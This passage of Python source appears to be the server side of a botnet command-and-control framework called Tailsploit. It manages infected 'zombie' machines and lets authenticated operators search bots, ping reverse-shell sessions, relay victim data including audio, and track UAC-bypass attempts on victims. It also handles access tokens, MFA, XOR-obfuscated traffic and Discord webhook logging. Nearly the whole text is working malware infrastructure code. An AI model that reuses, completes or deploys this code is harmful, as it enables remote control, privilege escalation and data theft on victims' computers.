        BotListXOR = self.handleXOREncryption(NewFormatZombies.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(BotListXOR)

    @StaticMethodCommandHandler("search", is_available=True, min_rank=1, reverse_shell_flag=False)
    def TailsploitSearchingQuery(self, admin_socket, admin_username, handelAdminShellCommands, *args):
        if len(args) < 1:
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'search <QUERY>' (Desktop Name / IP Address)."
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)
            return
        SearchQuery = f"{args[0]}"
        try:
            matching_clients = []
            for i, (client_addr, client_socket) in enumerate(self.TAILSPLOIT_ZOMBIES.items(), start=1):
                ip_address, port = client_addr
                desktop_name = "Malcolm" 

                if SearchQuery.lower() == desktop_name.lower():
                    formatted_desktop_name = f"{Back.YELLOW}{desktop_name}{Style.RESET_ALL}"
                    client_info = f"┃ {Fore.BLUE}{i:^5}{Style.RESET_ALL} ┃ {formatted_desktop_name[:17]:^17} ┃ {ip_address:^15} ┃ {port:^7} ┃\n"
                    matching_clients.append(client_info)
                elif SearchQuery == ip_address:
                    formatted_ip_address = f"{Back.YELLOW}{ip_address}{Style.RESET_ALL}"
                    client_info = f"┃ {Fore.BLUE}{i:^5}{Style.RESET_ALL} ┃ {desktop_name[:17]:^17} ┃ {formatted_ip_address:^15} ┃ {port:^7} ┃\n"
                    matching_clients.append(client_info)

            if not matching_clients:
                NegativeSearchQuery = f"{Fore.RED}[*]{Style.RESET_ALL} (Search Index) No clients matching your search query."
                NegativeSearchQueryXOR = self.handleXOREncryption(NegativeSearchQuery.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(NegativeSearchQueryXOR)
            else:
                matching_clients_str = ''.join(matching_clients)
                formatted_query_clients = f"""{Fore.GREEN}[*]{Style.RESET_ALL} Search result for clients/bots index: Matching IP/Name - {len(matching_clients)} Client(s) Found.

{matching_clients_str}
"""
                PositiveSearchQueryXOR = self.handleXOREncryption(formatted_query_clients.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(PositiveSearchQueryXOR)
        except: 
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'search <QUERY>' (Desktop Name / IP Address)."
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)

    @StaticMethodCommandHandler("ping", is_available=True, min_rank=2, reverse_shell_flag=True)
    def PingReverseShellTarget(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
            if target_socket:
                thread_target = "REVERSE_SHELL_THREAD=ISALIVE?"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                except Exception as e:
                    ErrorPing = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to ping the session."
            WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(WarningSessionXOR)

    def view_disconnected_clients(self, admin_socket):
        print("\nDisconnected Clients:")
        for addr in self.DISCONNECTED_ZOMBIES:
            print(f"Client {addr} is disconnected.")
        
        admin_socket.send("DISC".encode('utf-8'))

    @StaticMethodCommandHandler("tokenlist", is_available=True, min_rank=3, reverse_shell_flag=False)                
    def handleTokenList(self, admin_socket, *args):
        json_file = "../../lib/authentication/hash-token.json"

        if not os.path.exists(json_file) or os.path.getsize(json_file) == 0:
            GenToken = f"[{Fore.RED}*{Style.RESET_ALL}] 0 Token found. ('gentoken' to add one)"
            GenTokenXOR = self.handleXOREncryption(GenToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(GenTokenXOR)
            return

        with open(json_file, 'r') as file:
            data = json.load(file)

        token_list = []

        for key_info in data:
            token_info = {
                "id": key_info['id'],
                "token": key_info['token'],
                "permission": key_info['permission'],
                "status": key_info['status'],
                "createdTime": key_info['createdTime']
            }
            token_list.append(token_info)

        TokenListValue = self.format_token_list(token_list)
        TokenListValueXOR = self.handleXOREncryption(TokenListValue.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(TokenListValueXOR)

    def format_token_list(self, token_list):
        formatted_list = []
        formatted_list.append(f"[{Fore.GREEN}*{Style.RESET_ALL}] Total access token: {Fore.GREEN}{len(token_list)}{Style.RESET_ALL}\n")
        for token_info in token_list:
            formatted_list.append(f"Token ID: {Fore.GREEN}{token_info['id']}{Style.RESET_ALL}")
            formatted_list.append(f"Access-Token: {Fore.GREEN}{token_info['token']}{Style.RESET_ALL}")
            formatted_list.append(f"Permission: {Fore.GREEN}{token_info['permission']}{Style.RESET_ALL}")
            formatted_list.append(f"Status: {Fore.GREEN}{token_info['status']}{Style.RESET_ALL}")
            formatted_list.append(f"Created Time: {Fore.GREEN}{token_info['createdTime']}{Style.RESET_ALL}\n")

        return "\n".join(formatted_list)
    
    @StaticMethodCommandHandler("generate-token", is_available=True, min_rank=3, reverse_shell_flag=False)
    def OnGenerateTokenAuth(self, admin_socket, *args):
        TailsploitLocalPermissionHiearchy = ['user', 'admin', 'root']
        if len(args) != 3:
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'generate-token --permission user/admin/root'."
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)
            return

        if args[2] in TailsploitLocalPermissionHiearchy:
            pass
        else:
            print(f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'user/admin/root' as permission")
            return

        UserPermissionToken = args[2]

        try:
            CreateTaileploitAccessToken = GenerateHashkeyRequest(self.TSF_TOKEN_DEFAULT_LENGTH, UserPermissionToken)

            CreatedFormatToken = f"""
[{Fore.BLUE}*{Style.RESET_ALL}] New access token has been generated ({Fore.RED}Keep it secret{Style.RESET_ALL})

{Fore.YELLOW}Disclaimer{Style.RESET_ALL}: This key has been generated for use in the botnet system.
Do not share or expose this key to unauthorized individuals.

This key grants access to sensitive information and control over the botnet network.
Keep this key secure and do not store it in unencrypted form.

Unauthorized distribution or usage of this key is strictly prohibited.

ACCESS TOKEN (Permission set -> {UserPermissionToken}): {Fore.GREEN}{CreateTaileploitAccessToken}{Style.RESET_ALL}

For more information, see the JSON file located at:
{Fore.YELLOW}lib/authentication/hash-token.json{Style.RESET_ALL}
"""
            SendTokenToAdmin = self.handleXOREncryption(CreatedFormatToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(SendTokenToAdmin)
        except Exception as e:
            print(f"{Fore.RED}[!]{Style.RESET_ALL} An error occured while generating the token. {e}")

    @StaticMethodCommandHandler("adminsession", is_available=True, min_rank=1, reverse_shell_flag=False)
    def handleAdminListCommand(self, admin_socket, *args):
        admin_list = []
        for username, admin_info in self.TAILSPLOIT_ADMINS_SESSION.items():
            addr = admin_info["addr"]
            join_time = admin_info["join_time"]
            permission = admin_info["permission"]
            uptime = time.time() - join_time
            uptime_str = self.format_uptime(uptime)
            admin_list.append(f"{username} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} ~ {permission} (Uptime: {Fore.GREEN}{uptime_str}{Style.RESET_ALL})")

        num_admins = len(admin_list)
        response = f"[{Fore.GREEN}*{Style.RESET_ALL}] {num_admins} Administrator(s) are/is currently connected\n"
        if num_admins > 0:
            response += "\n"
            response += "\n".join(f"{admin}" for admin in admin_list)

        OnlineAdministratorsXOR = self.handleXOREncryption(response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(OnlineAdministratorsXOR)

    @StaticMethodCommandHandler("mysession", is_available=True, min_rank=1, reverse_shell_flag=False)
    def handleAdminInfoCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
            admin_info = self.TAILSPLOIT_ADMINS_SESSION.get(admin_username)
            if admin_info:
                addr = admin_info["addr"]
                join_time = admin_info["join_time"]
                uptime = time.time() - join_time
                uptime_str = self.format_uptime(uptime)

                CurrentSessionInfo = f"[{Fore.GREEN}*{Style.RESET_ALL}] Current Session Information → {admin_username}:\n\n{Fore.GREEN}{admin_username}{Style.RESET_ALL} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} (Uptime: {Fore.GREEN}{uptime_str}{Style.RESET_ALL})"
                CurrentSessionInfoXOR = self.handleXOREncryption(CurrentSessionInfo.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(CurrentSessionInfoXOR)
            else:
                AdminNotFound = f"[-] Admin {admin_username} not found."
                AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(AdminNotFoundXOR)

    @StaticMethodCommandHandler("authstatus", is_available=True, min_rank=3, reverse_shell_flag=False)
    def handleServerAuthorizationDetails(self, admin_socket, admin_username, handleAmdminShellCommands, *args):
        AuthorizationStatus = f"""[{Fore.GREEN}*{Style.RESET_ALL}] Server Authorization Details / Status:
                
Server Encrypted Communication : {Fore.GREEN}Enabled{Style.RESET_ALL}
Server Authentication Token : {Fore.GREEN}Enabled{Style.RESET_ALL}
Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED}{ "Enabled" if self.TSF_SESSION_TIMEOUT else "Disabled"}{Style.RESET_ALL}
Server MFA (Multi-Factor Authentication) : {Fore.GREEN if self.TSF_MFA_SESSION_STATE else Fore.RED}{ "Enabled" if self.TSF_MFA_SESSION_STATE else "Disabled"}{Style.RESET_ALL}"""
        AuthorizationStatusXOR = self.handleXOREncryption(AuthorizationStatus.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(AuthorizationStatusXOR)

    def format_uptime(self, uptime):
        days = int(uptime // (60 * 60 * 24))
        hours = int((uptime // (60 * 60)) % 24)
        minutes = int((uptime // 60) % 60)
        seconds = int(uptime % 60)

        uptime_str = ""
        if days > 0:
            uptime_str += f"{days}d "
        if hours > 0:
            uptime_str += f"{hours}h "
        if minutes > 0:
            uptime_str += f"{minutes}min "
        uptime_str += f"{seconds}s"

        return uptime_str
    
    def TailsploitBasicSessionHandler(self, client_socket, client_addr):
            try:
                AUTHENTICATION_KEY_XOR = client_socket.recv(4096)
                AUTHENTICATION_KEY = self.handleXOREncryption(AUTHENTICATION_KEY_XOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
            except ConnectionResetError:
                client_socket.close()
                AUTHENTICATION_KEY = ""
            
            if "--FLAG:CLIENT_PAYLOAD" in AUTHENTICATION_KEY:
                key_parts = AUTHENTICATION_KEY.split('::')
                if key_parts[0] == "--FLAG:CLIENT_PAYLOAD":
                    if len(key_parts) == 3:
                        _, bypass_uac, desktop_name = key_parts
                        print(f"BypassUAC: {bypass_uac}")
                        print(f"DesktopName: {desktop_name}")
                    else:
                        print("Invalid authentication key format: Incorrect number of parts")
                else:
                    print("Invalid authentication key format: Missing '--FLAG:CLIENT_PAYLOAD'")

                #if self.d:
                    #TailsploitIncomingConnectionRegularClient(client_addr)
                self.TAILSPLOIT_ZOMBIES[client_addr] = client_socket
                return

            OnAuthTokenResult = self.TailsploitTokenHandler(AUTHENTICATION_KEY)
            print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} An Administrator Attempt To Connect ({Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
            if len(self.TAILSPLOIT_ADMINS_SESSION) >= self.TSF_SERVER_MAX_ADMINS_CONN:
                print("Max Admin Reached")
                client_socket.close()
                return
            if self.TAILSPLOIT_LOG_WEBOOK:
                TailsploitIncomingConnectionAdminClient(client_addr)
            if OnAuthTokenResult == "--FLAG_TOKEN_ALREADY_IN_USE":
                TokenAlreadyInUse = "--FLAG_PROVIDED_TOKEN_ALREADY_IN_USE"
                TokenAlreadyInUseXOR = self.handleXOREncryption(TokenAlreadyInUse.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN )
                client_socket.send(TokenAlreadyInUseXOR)
                client_socket.close()
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Already In Use ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientRejectedTokenAlreadyInUse(client_addr)
            elif OnAuthTokenResult == "--FLAG_TOKEN_NOT_VALID":
                TokenNotValid = "--FLAG_PROVIDED_TOKEN_NOT_VALID"
                TokenNotValidXOR = self.handleXOREncryption(TokenNotValid.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN )
                client_socket.send(TokenNotValidXOR)
                client_socket.close()
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Not Valid ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientRejectedTokenNotValid(client_addr)
            elif OnAuthTokenResult == "--FLAG_TOKEN_REVOKED":
                TokenRevoked = "--FLAG_PROVIDED_TOKEN_REVOKED"
                TokenRevokedXOR = self.handleXOREncryption(TokenRevoked.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                client_socket.send(TokenRevokedXOR)
                client_socket.close()
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Revoked ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientRejectedTokenRevoked(client_addr)
            else:
                OnAuthTokenResult = True

            if OnAuthTokenResult == True:
                OnAuthorizeToken = f"--FLAG_TAILSPLOIT_AUTHENTICATION?AUTHORIZED={AUTHENTICATION_KEY}"
                AUTHORIZED_TOKEN_CONVERTXOR = self.handleXOREncryption(OnAuthorizeToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                client_socket.send(AUTHORIZED_TOKEN_CONVERTXOR)

                if self.TSF_MFA_SESSION_STATE:
                    REQUIRE_MFA_FLAG = "--FLAG_MFA_REQUIRED"
                    REQUIRE_MFA_FLAG_XOR = self.handleXOREncryption(REQUIRE_MFA_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    client_socket.send(REQUIRE_MFA_FLAG_XOR)
                    while True:
                        MFA_AUTH_ADMIN = client_socket.recv(1024)
                        MFA_AUTH_ADMIN_DECODED = self.handleXOREncryption(MFA_AUTH_ADMIN, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                        
                        if MFA_AUTH_ADMIN_DECODED == self.TSF_MFA_SESSION_PASSWORD:
                            MFA_STATUS_200_FLAG = "--FLAG_MFA_STATUS=200"
                            MFA_STATUS_200_FLAG_XOR = self.handleXOREncryption(MFA_STATUS_200_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                            client_socket.send(MFA_STATUS_200_FLAG_XOR)
                            break
                        else:
                            MFA_STATUS_404_FLAG = "--FLAG_MFA_STATUS=404"
                            MFA_STATUS_404_FLAG_XOR = self.handleXOREncryption(MFA_STATUS_404_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                            client_socket.send(MFA_STATUS_404_FLAG_XOR)
                            print(f"{Fore.RED}[*]{Style.RESET_ALL} The MFA Code Provided Is Incorrect ({MFA_AUTH_ADMIN_DECODED})")
                            continue
                else:
                    PASS_MFA_FLAG = "--FLAG_MFA_NOT_REQUIRED"
                    PASS_MFA_FLAG_XOR = self.handleXOREncryption(PASS_MFA_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    client_socket.send(PASS_MFA_FLAG_XOR)

                try:
                    AdminUsernameXOR = client_socket.recv(1024)
                    AdminUsername = self.handleXOREncryption(AdminUsernameXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                    #print(f"Received username from admin {client_addr}: {AdminUsername}")

                    # Check if the admin username is already chosen
                    if AdminUsername in self.TAILSPLOIT_ADMINS_SESSION:
                        UsernameTaken = "--FLAG_USERNAME_ALREADY_CHOSEN"
                        UsernameTakenXOR = self.handleXOREncryption(UsernameTaken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        client_socket.send(UsernameTakenXOR)
                        client_socket.close()
                        print(f"Admin {AdminUsername} username already chosen. Connection closed.")

                        return
                    else: 
                        UsernameAvailable = "--FLAG_USERNAME_AVAILABLE"
                        UsernameAvailablenXOR = self.handleXOREncryption(UsernameAvailable.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        client_socket.send(UsernameAvailablenXOR)

                except ConnectionResetError:
                    print(f"No username received from admin {client_addr}")
                    AdminUsername = ""

                admin_info = {"socket": client_socket, "addr": client_addr, "join_time": time.time(), "token": AUTHENTICATION_KEY, "permission": self.SESSION_PERMISSION}
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Starting Administrator Session... Connection Initiated - {AdminUsername} ({Fore.GREEN}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")

                self.TAILSPLOIT_ADMINS_SESSION[AdminUsername] = admin_info
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientAuthorized(client_addr)

                admin_thread = threading.Thread(target=self.TailsploitPrivilegeSessionHandler, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Data Handler - @{AdminUsername}")
                admin_thread.start()

                if self.TSF_SESSION_TIMEOUT:    
                    admin_timeout_session_thread = threading.Timer(self.TSF_SESSION_TIMEOUT_TIME, self.TailsploitTimeoutSession, args=(client_socket, AdminUsername,))
                    admin_timeout_session_thread.name = f"Tailsploit Admin Session Timeout Handler - @{AdminUsername}"
                    admin_timeout_session_thread.start()
            else:
                pass
    
    @StaticMethodCommandHandler("latency", is_available=True, min_rank=1, reverse_shell_flag=False)
    def TailsploitPingServer(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if len(args) < 0:
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'ping'"
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)
            return
        end_time = time.time() * 1000
        response_time = end_time - self.TIME_MS

        ResponseTailsploitPing = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server is alive: {Fore.GREEN}{response_time:.2f} ms{Style.RESET_ALL}"
        ResponseTailsploitPingXOR = self.handleXOREncryption(ResponseTailsploitPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(ResponseTailsploitPingXOR)

    @StaticMethodCommandHandler("logout", is_available=True, min_rank=1, reverse_shell_flag=False)
    def TailsploitOnLogout(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        DisconnectAdminFlag = "--FLAG_LOGOUT_FROM_SERVER"
        DisconnectAdminFlagXOR = self.handleXOREncryption(DisconnectAdminFlag.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(DisconnectAdminFlagXOR)

    @StaticMethodCommandHandler("kick", is_available=True, min_rank=3, reverse_shell_flag=False)
    def TailsploitOnKickAdmin(self, admin_socket, admin_username, handleAdminShellCommands, *args):
            if len(args) < 1:
                InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'kick  <username>.'"
                InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(InvalidFormatXOR)
                return
            if args[0] in self.TAILSPLOIT_ADMINS_SESSION:
                admin_info = self.TAILSPLOIT_ADMINS_SESSION[args[0]]
                KickedFromServer = "--FLAG_KICKED_FROM_SERVER"
                KickedFromServerXOR = self.handleXOREncryption(KickedFromServer.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                TargetSocket = admin_info["socket"]
                TargetSocket.send(KickedFromServerXOR)
                TargetSocket.close()
                SuccessfullyKickedUserFromServer = f"[{Fore.GREEN}*{Style.RESET_ALL}] Administrator '{Fore.GREEN}{args[0]}{Style.RESET_ALL}' has been successfully kicked."
                SuccessfullyKickedUserFromServerXOR = self.handleXOREncryption(SuccessfullyKickedUserFromServer.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(SuccessfullyKickedUserFromServerXOR)
                print(f"[{Fore.RED}-{Style.RESET_ALL}] Administrator '{args[0]}' has been kicked by {admin_username}")

            else:
                AdminNotFound = f"[{Fore.RED}-{Style.RESET_ALL}] Administrator '{Fore.RED}{args[0]}{Style.RESET_ALL}' not found."
                AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(AdminNotFoundXOR)

    def TailsploitTrafficCommunicationData(self):
        while True:
            try:
                if not self.TAILSPLOIT_ZOMBIES:
                    continue

                readable, _, _ = select.select(list(self.TAILSPLOIT_ZOMBIES.values()), [], [], 1)
                
                for client_socket in readable:
                    try:
                        data = client_socket.recv(4096)
                        if data:
                            self.IncomingDataSocket(client_socket, data)
                    except UnicodeDecodeError:
                        pass
                    except ConnectionResetError:
                        self.HandleClientDisconnect(client_socket)
                            
            except Exception as e:
                pass

    def IncomingDataSocket(self, client_socket, data):
        if data.startswith(b"AUD:"):
            self.ForwardToAdminSocket(data)
        else:
            decoded_data = data.decode("utf-8")
            self.process_data(client_socket, decoded_data)

    def HandleClientDisconnect(self, client_socket):
        with self.TAILSPLOIT_THREAD_LOCK_ZOMBIES:
            for client_addr, socket in self.TAILSPLOIT_ZOMBIES.items():
                if socket == client_socket:
                    del self.TAILSPLOIT_ZOMBIES[client_addr]
                    if client_addr not in self.DISCONNECTED_ZOMBIES:
                        self.DISCONNECTED_ZOMBIES.add(client_addr)
                        print(f"{Fore.RED}[-]{Style.RESET_ALL} Client {Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL} Disconnected from the botnet")

    def ForwardToAdminSocket(self, data):
        if self.admin_socket:
            self.admin_socket.send(data)
    
    def ForwardToAllAdminSocket(self, handleAdminShellCommands, admin_username):
        parts = handleAdminShellCommands.split()

        # Check if the string starts with '--FLAG_MESSAGE_MODE_ADMN'
        if parts and parts[0] == '--FLAG_MESSAGE_MODE_ADMN':
            # Remove the flag name and keep the rest
            FormattedStringMessageADMN = ' '.join(parts[1:])
            StringWithADMN = f"--FLAG_MESSAGE_MODE_ADMN_FORWARDED \x1B[4m{admin_username}\x1B[0m: {FormattedStringMessageADMN}"
            for admin_username, admin_info in self.TAILSPLOIT_ADMINS_SESSION.items():
                admin_socket = admin_info['socket']
                try:
                    AdminForwardMessageXOR = self.handleXOREncryption(StringWithADMN.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(AdminForwardMessageXOR)
                except Exception as e:
                    # Handle any exceptions that occur while sending the message to this admin
                    print(f"Failed to send message to {admin_username}: {str(e)}")
            print(StringWithADMN)
        else:
            # String doesn't start with the flag, handle this case accordingly
            print("String doesn't start with the flag.")

    def process_data(self, client_socket, decoded_data):
        if decoded_data == "REVERSE_SHELL_THREAD=ISALIVE?TRUE":
            try:
                isAlive = f"{Fore.GREEN}[*]{Style.RESET_ALL} Reverse Shell (TCP) - Target is alive"
                isAliveXOR = self.handleXOREncryption(isAlive.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(isAliveXOR)
            except Exception as e:
                print(e)
        elif decoded_data == "--FLAG:UAP=TRUE":
            try:
                UserUAP = f"{Fore.GREEN}[*]{Style.RESET_ALL} This session has administrative privileges. (UAC Bypass {Fore.GREEN}(+){Style.RESET_ALL})"
                UserUAPXOR = self.handleXOREncryption(UserUAP.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(UserUAPXOR)
            except Exception as e:
                print(e)
        elif decoded_data == "--FLAG:UAP=FALSE":
            try:
                UserUAP = f"{Fore.RED}[*]{Style.RESET_ALL} This session does not have administrative privileges. (UAC Bypass {Fore.RED}(-){Style.RESET_ALL})"
                UserUAPXOR = self.handleXOREncryption(UserUAP.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(UserUAPXOR)
            except Exception as e:
                print(e)
        elif decoded_data == "--FLAG:UAC_BYPASS_ATTEMPT":
            try:
                BypassUAC = f"{Fore.YELLOW}[*]{Style.RESET_ALL} Attempting to bypass UAC... (Target payload restarting, closing current TCP Session)"
                BypassUACXOR = self.handleXOREncryption(BypassUAC.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(BypassUACXOR)
            except Exception as e:
                print(e)
        elif decoded_data == "--FLAG:UAC_BYPASS_ALRDY":
            try:
                BypassUACAlrdy = f"{Fore.GREEN}[*]{Style.RESET_ALL} This session hass already administrative privilege."
                BypassUACAlrdyXOR = self.handleXOREncryption(BypassUACAlrdy.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                self.admin_socket.send(BypassUACAlrdyXOR)
            except Exception as e:
                print(e)

        else:
            SendingDataXOR = self.handleXOREncryption(decoded_data.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            self.admin_socket.send(SendingDataXOR)

    def TailsploitTimeoutSession(self, timeout_admin_socket, timeout_admin_username):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{timeout_admin_username}\x1B[0m Timed Out.")
        timeout_admin_socket.close()

    def ConfigurationTailsploitServer(self):
        WebhookPrimaryIndex = None
        WebhookSecondaryIndex = None
        os.system("cls")
        spin = Spinner(Box1)
        for i in range(50):
            print(u"\r{0} Starting Tailsploit Server...".format(spin.next()), end="")
            sys.stdout.flush()
            time.sleep(0.1)
        os.system("cls")
        while True:
            print("")
            TailsploitWebhook = input(f"[{Fore.RED}*{Style.RESET_ALL}] {Fore.RED}Tailsploit{Style.RESET_ALL} - Would you like to enable Discord Webhook ? ({Fore.YELLOW}tailsploit-server-config.json{Style.RESET_ALL}) > ")
            if TailsploitWebhook == "y":
                self.TAILSPLOIT_LOG_WEBOOK = True
                print("")
                print(f"[{Fore.YELLOW}*{Style.RESET_ALL}] Verifying Webhook status...")
                time.sleep(2)
                FirstIndex = TailsploitWebRequestFirstIndex()
                SecondIndex = TailsploitWebRequestSecondIndex()
                print("")
                if FirstIndex == "--FLAG_WEBHOOK_FIRST_SUCESS":
                    print(f"1. [{Fore.GREEN}+{Style.RESET_ALL}] Status: {Fore.GREEN}200{Style.RESET_ALL}")
                    WebhookPrimaryIndex = True
                elif FirstIndex == "--FLAG_WEBHOOK_FIRST_ERROR":
                    print(f"1. [{Fore.RED}-{Style.RESET_ALL}] Status: {Fore.RED}404{Style.RESET_ALL}- Please verify your webhook URL.")
                else:
                    print(f"[{Fore.RED}*{Style.RESET_ALL}] An error occured while checking first webhook.")
                if SecondIndex == "--FLAG_WEBHOOK_SECOND_SUCESS":
                    WebhookSecondaryIndex = True
                    print(f"2. [{Fore.GREEN}+{Style.RESET_ALL}] Status: {Fore.GREEN}200{Style.RESET_ALL}")
                elif SecondIndex == "--FLAG_WEBHOOK_SECOND_ERROR":
                    print(f"2. [{Fore.RED}-{Style.RESET_ALL}] Status: {Fore.RED}404{Style.RESET_ALL} - Please verify your webhook URL.")
                else:
                    print(f"[{Fore.RED}*{Style.RESET_ALL}] An error occured while checking second webhook.")
                
                if WebhookPrimaryIndex and WebhookSecondaryIndex:
                    time.sleep(1)
                    os.system("cls")
                    self.InitializingTailsploitServer()
                    break

            elif TailsploitWebhook == "n":
                self.TAILSPLOIT_LOG_WEBOOK = False
                
                print("")
                print(f"[{Fore.RED}*{Style.RESET_ALL}] Skipping Discord Webhook Setup")
                break
            else:
                continue
        
    def InitializingTailsploitServer(self):
        start_time = time.time()

        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Setting up Tailsploit Server...")
        time.sleep(0.5)
        try:
            print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking Port Provided Format...")
            time.sleep(0.1)
            print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking IPv4 Provided Format...")
            socket.inet_pton(socket.AF_INET, self.TSF_SERVER_IP)
